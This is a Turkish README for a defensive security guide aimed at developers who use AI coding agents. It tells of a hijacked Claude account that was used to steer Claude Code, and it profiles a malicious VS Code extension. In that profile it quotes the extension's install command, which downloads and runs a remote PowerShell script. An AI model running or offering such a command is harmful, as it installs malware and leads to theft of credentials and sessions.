# Yapay zekâ ajanları için güvenlik rehberi

**Nexivion Labs** · ilk sürüm 6 Kasım 2026 · sürüm 2.2, 8 Kasım 2026 ([değişiklikler](CHANGELOG.md))

4 Kasım 2026'da ekibimizden bir geliştiricinin Claude hesabı ele geçirildi: hesabında, onun açmadığı bir web oturumundan Çince talimatlar verildi ve Claude Code'a başkası için kod yazdırıldı. Bilgisayarı 28 Ekim'den beri enfekteydi; en güçlü şüpheli, internetten indirilip kurulan bir VS Code eklentisiydi. 5'i 6'ya bağlayan gece olaya Claude ile birlikte müdahale ettik.

Bu depo, o gecenin dersleriyle hazırlandı. Yapay zekâ ajanlarıyla (Claude Code, Cursor, Copilot, Cline ve benzerleri) çalışan geliştiriciler ve küçük ekipler için yazıldı.

> Bu rehber hukuki ya da profesyonel adli bilişim hizmetinin yerine geçmez. Ciddi bir olayda kurumunuzun güvenlik ekibiyle ya da bir uzmanla çalışın.

---

## Şu an bir olay mı yaşıyorsunuz?

Okumayı bırakın ve doğrudan şuraya gidin: **[Olay anında: ilk 15 dakika, ilk saat, ilk gün](docs/02-olay-aninda.md)**

Kısa hâli:

1. **Silmeyin, kapatmayın, ama ağdan ayırın.** Oturumu durdurun, ekranları telefonla fotoğraflayın, kabloyu/Wi-Fi'ı kesin.
2. **O bilgisayarı ele geçirilmiş sayın.** Ondan hiçbir hesaba giriş yapmayın.
3. **Temiz bir cihazdan** sırayla kapatın: e-posta → yapay zekâ hesabı (bulut oturumunu durdur, ekranları fotoğrafla, tüm oturumlardan çık, Claude Code yetkileri, API anahtarları) → GitHub (oturumlar, token'lar, **güvenlik günlüğünü hemen dışa aktar**) → diğer anahtarlar.
4. Bir kişi yönetsin, bir kişi saat saat [olay kaydı](sablonlar/olay-kaydi.md) tutsun.

Yazdırıp elinizde tutabileceğiniz tek sayfa: [kontrol-listeleri/olay-ani.md](kontrol-listeleri/olay-ani.md)

---

## İçindekiler

| # | Bölüm | Ne zaman okunur |
|---|---|---|
| 0 | [Çekirdek kurallar](docs/00-cekirdek-kurallar.md) | Önce bunu okuyun: rehberin on maddelik özü |
| 1 | [Kurmadan önce: olmazsa olmaz kontroller](docs/01-kurmadan-once.md) | Yeni bir eklenti, paket, depo ya da araç kurmadan önce |
| 2 | [Olay anında](docs/02-olay-aninda.md) | Hesap ya da bilgisayar ele geçirildiğinde |
| 3 | [Claude ile adli inceleme: üç istem](docs/03-claude-ile-adli-inceleme.md) | Olayın kaynağını bulmak için |
| 4 | [Claude Code'u sertleştirme](docs/04-claude-code-sertlestirme.md) | Kurulumdan hemen sonra, ekip ayarlarını belirlerken |
| 5 | [İstem enjeksiyonu ve MCP sunucuları](docs/05-istem-enjeksiyonu-ve-mcp.md) | Ajana dış içerik okutmadan, MCP sunucusu eklemeden önce |
| 6 | [Tedarik zinciri: npm, pip ve eklentiler](docs/06-tedarik-zinciri.md) | Paket yöneticisi ve eklenti politikası belirlerken |
| 7 | [Ekip politikası ve düzenli kontroller](docs/07-ekip-politikasi.md) | Ekibe yeni biri katıldığında, her ay |
| 8 | [Senaryolar: önle, fark et, müdahale et](docs/08-senaryolar.md) | Belirli bir durum için hazır plan ararken |
| 9 | [Hesap, kimlik ve oturum güvenliği](docs/09-hesap-ve-oturum-guvenligi.md) | Hesaplarınızı ilk kez gözden geçirirken; iki adımlı doğrulama yetmez mi diye merak ederken |
| 10 | [Platform başvuru kartı](docs/10-platform-basvuru-karti.md) | Windows, macOS, Linux ve WSL2 için komut karşılıklarını ararken |
| 11 | [Yedekleme ve kurtarma](docs/11-yedekleme-ve-kurtarma.md) | "Yedekten döneriz" demeden önce; üç ayda bir geri yükleme tatbikatı |
| 12 | [Bulutta ve konteynerde çalışan ajanlar](docs/12-bulutta-ajan.md) | Claude Code on the web, Codespaces ya da Dev Container kullanıyorsanız |
| 13 | [Veri nereye gidiyor?](docs/13-veri-nereye-gidiyor.md) | Gizlilik, eğitim izni, diskteki oturum dökümleri ve tarayıcıda çalışan ajanlar |
| 14 | [Ajanın yazdığı kodun güvenliği](docs/14-ajanin-yazdigi-kod.md) | Ajanın PR'ını incelemeden, önerdiği paketi kurmadan önce |
| 15 | [Tuzak kur, zinciri kır](docs/15-tuzak-kur-zinciri-kir.md) | Kapı açılırsa erken haber almak için: kanarya sırları, işlem kaydı, saldırı zinciri |
| — | [Standart eşlemesi](docs/standart-eslemesi.md) | OWASP ve NIST karşılıklarını görmek için |

### Hazır malzemeler

- **Kontrol listeleri:** [Tek sayfalık kurulum öncesi kontrol](kontrol-listeleri/kurmadan-once.md) · [Olay anı kontrol listesi](kontrol-listeleri/olay-ani.md) · [Aylık kontrol](kontrol-listeleri/aylik-kontrol.md) · [Ajan kodu inceleme](kontrol-listeleri/ajan-kodu-inceleme.md)
- **Şablonlar:** [Olay kaydı (zaman çizelgesi)](sablonlar/olay-kaydi.md) · [Sağlayıcıya olay bildirimi](sablonlar/olay-bildirimi.md) · [Delil zinciri kaydı](sablonlar/delil-zinciri.md) · [Onaylı araçlar listesi](sablonlar/onayli-araclar.md) · [Masa başı tatbikat](sablonlar/masa-basi-tatbikat.md)
- **Örnek ayar dosyaları:** [Claude Code `settings.json`](ornekler/claude-settings.json) · [`.npmrc`](ornekler/npmrc) · [VS Code eklenti izin listesi](ornekler/vscode-extensions-allowed.jsonc) · [Örnek `CLAUDE.md`](ornekler/CLAUDE.md.ornek) · [Güvenlik kapısı hook'u](ornekler/hooks/guvenlik_kapisi.py) · [Sertleştirilmiş GitHub Actions](ornekler/github/guvenli-ci.yml)
- **[Sözlük](SOZLUK.md):** rehberde geçen teknik terimlerin Türkçe açıklamaları.

---

## Olayla ilişkilendirilen eklenti: Alpme

> **Durum: kendi delil paketimizle karşılaştırıldı (8 Kasım 2026).** Etkilenen bilgisayardan topladığımız adli kayıttaki eklenti kimliği, sürümü ve kurulum yolu aşağıdaki bilgilerle eşleşiyor. Eklentinin olaydaki rolü **en güçlü şüphe** düzeyindedir: Defender tespitleri, eklentinin etkinleştiği her açılıştan 38 ila 66 saniye sonra geldi ve kodunda dosya bırakıp çalıştırma izleri var; ama geçici klasördeki zararlı dosyaları bu eklentinin bıraktığını tek başına kanıtlayamadık. [Çekirdek kural 10](docs/00-cekirdek-kurallar.md): kanıtla doğrulanmamış şey hipotezdir.

Rehberin ilk sürümünde eklentinin adını vermemiştik. Bağımsız raporlar kamuya açık olduğu ve kendi kanıtımız da aynı kimliği gösterdiği için, okuyanların kendi bilgisayarlarını kontrol edebilmesi adına ekliyoruz.

| Alan | Bilgi |
|---|---|
| Ad ve sürüm | **Alpme**, v1.0.25 (VS Code eklentisi), kimlik `alpme.alpme` |
| Yem | alpme.com üzerinden "ücretsiz yapay zekâ kredisi / birleşik API geçidi" vaadi |
| Nasıl kuruldu | Pazar yerinden değil: sitenin verdiği tek satırlık PowerShell komutu (`irm alpme.com/install.ps1 \| iex`) ve VSIX dosyası. Vakamızda kurulum tarihi 28 Ekim 2026; bağımsız uyarı bir gün önce yayımlanmıştı. |
| Parmak izi | `dist/extension.js`, 36.645.066 bayt, SHA-256 `2EFE984AB0C9DCC24DF5586DFCF1F62BD8F4EE5E804EBDD6ACDDD40AB2E853AA` |
| Ne yapıyor | Bizim incelememizde: ağır biçimde gizlenmiş kod, geçici klasöre dosya yazma, çalıştırma izni verme ve bağımsız süreç başlatma izleri. Bağımsız raporlara göre: arka planda çalıştırılabilir dosyalar indirip çalıştıran bir damlatıcı (dropper); indirilenler tarayıcı çerezlerini, oturumları ve uygulama token'larını toplayan bilgi hırsızları. |
| Nasıl kontrol ederim | Eklenti klasörünüzde `alpme` geçen bir dizin var mı: `%USERPROFILE%\.vscode\extensions\` (Windows), `~/.vscode/extensions/` (macOS/Linux) ve kullandığınız diğer editörlerin (Cursor, Windsurf, Antigravity) eklenti klasörleri. Komutlar: [Bölüm 10.2](docs/10-platform-basvuru-karti.md#102-kurulu-editör-eklentilerini-listeleme) |
| Varsa | Silmeyin; [Olay anında](docs/02-olay-aninda.md) bölümünü uygulayın. Bu eklentiyi kurmuş bir bilgisayardaki **bütün** oturumlar ve şifreler ele geçirilmiş sayılmalıdır. |

> **Dikkat: bu rehberin adını taşıyan "tespit betiği" ya da "temizleme aracı" gönderen biri olursa çalıştırmayın.** Rehber hiçbir yerde sizden bir dosya indirip çalıştırmanızı istemez; yukarıdaki kontrol yalnız klasörlere bakmaktır.

Bağımsız kaynaklar: PenguinBTW'nin tespit aracı ve adli raporu (https://github.com/PenguinBTW/alpme-detector), Trustpilot'taki kullanıcı bildirimleri. Bu rehber zararlı yazılımın teknik ayrıntılarını bilerek vermez; savunma için yukarıdakiler yeterlidir.

## Olaydan çıkardığımız altı ders

1. **Uyarılar vardı, bakan yoktu.** Windows Defender 28 Ekim ile 4 Kasım arasında beş ayrı günde toplam 25 tespit kaydetti. Eklentiyle ilgili bağımsız bir uyarı da kurulumdan bir gün önce yayımlanmıştı. Güvenlik aracının kurulu olması yetmez; birinin düzenli bakması gerekir.
2. **Eklenti, kodun kendisi kadar yetkilidir.** VS Code eklentileri sizin kullanıcı yetkinizle, siz bir şey yapmadan çalışabilir. Ajanın güvenliği, ajanın çalıştığı bilgisayarın güvenliğinden büyük olamaz.
3. **Oturum anahtarı, şifreden daha değerlidir.** Saldırgan şifreye ihtiyaç duymadı. En olası açıklama, oturum bilgisinin bilgisayardan alınmasıdır; bunu kesin olarak kanıtlayamadık, ama belirtiler bu yöntemle uyumlu. İki adımlı doğrulama bu durumda tek başına korumaz; oturumların da kapatılması gerekir.
4. **Silmek, izi siler.** İlk refleks "hemen kaldır" oluyor. Önce delil, sonra temizlik.
5. **Ajan, müdahalede de işe yarar, ama kurallarla.** Salt okunur, adım adım ve sırları ekrana yazmayan bir inceleme, kaynağı saatler içinde bulmamızı sağladı.
6. **Kapıyı tek satır açtı.** Bilgisayardaki iki şüpheli yazılımın ikisi de internetten indirilen bir betiğin doğrudan çalıştırılmasıyla (`irm … | iex`) kurulmuştu. Okunmadan çalıştırılan betik, kapıyı içeriden açmaktır ([Bölüm 1](docs/01-kurmadan-once.md)).

---

## Doğruluk ve güncellik

Rehberdeki araç ayarları, komutlar ve sürüm bilgileri **7 Kasım 2026** tarihinde resmî belgelerle karşılaştırıldı (Claude Code sandbox ve izin belgeleri, VS Code kurumsal belgeleri, npm 12 duyurusu, Claude destek makaleleri, KVKK Kurul kararı 2019/10). Araçlar hızla değiştiği için bir ayar çalışmazsa önce ilgili resmî belgeye bakın, sonra [bize bildirin](CONTRIBUTING.md). Hangi iddianın hangi kaynakla doğrulandığı ve doğrulanamayanlar [DONGU-LOG.md](DONGU-LOG.md) dosyasında kayıtlıdır.

## Katkı

Rehber yaşayan bir belgedir. Hata, eksik ya da kendi olayınızdan bir ders varsa [katkı rehberine](CONTRIBUTING.md) bakın. Rehberin kendisinde bir güvenlik sorunu (ör. yanlış ya da tehlikeli bir komut) bulursanız [SECURITY.md](SECURITY.md) dosyasındaki yolu izleyin.

## Kaynaklar

- Anthropic, Tehdit İstihbaratı Raporu, Eylül 2026: https://www.anthropic.com/threat-intelligence-report-september-2026
- PenguinBTW, Alpme eklentisi tespit aracı ve adli rapor (olaydan önce yayımlanmış bağımsız uyarı): https://github.com/PenguinBTW/alpme-detector
- KVKK, Veri İhlali Bildirimi (Kurul kararı 2019/10): https://www.kvkk.gov.tr/Icerik/5362/Veri-Ihlali-Bildirimi
- Claude Destek, tüm oturumlardan çıkış: https://support.claude.com/en/articles/10310342-how-do-i-log-out-of-all-active-sessions
- Claude Destek, etkin oturumları yönetme: https://support.claude.com/en/articles/13124001-managing-your-active-sessions
- Claude Destek, API anahtarı ele geçirildiyse: https://support.claude.com/en/articles/8384961-what-should-i-do-if-i-suspect-my-api-key-has-been-compromised
- Claude Code belgeleri (güvenlik, izinler, sandbox, ayarlar): https://code.claude.com/docs/en/security
- VS Code, kurumsal eklenti yönetimi: https://code.visualstudio.com/docs/enterprise/extensions

Olayı Anthropic'e ve GitHub'a kanıtlarıyla bildirdik. Ekran görüntüleri ekip arkadaşımızın rızasıyla paylaşılmıştır.

Lisans: [CC BY 4.0](LICENSE) · **Nexivion Labs** · nexivionlabs.io
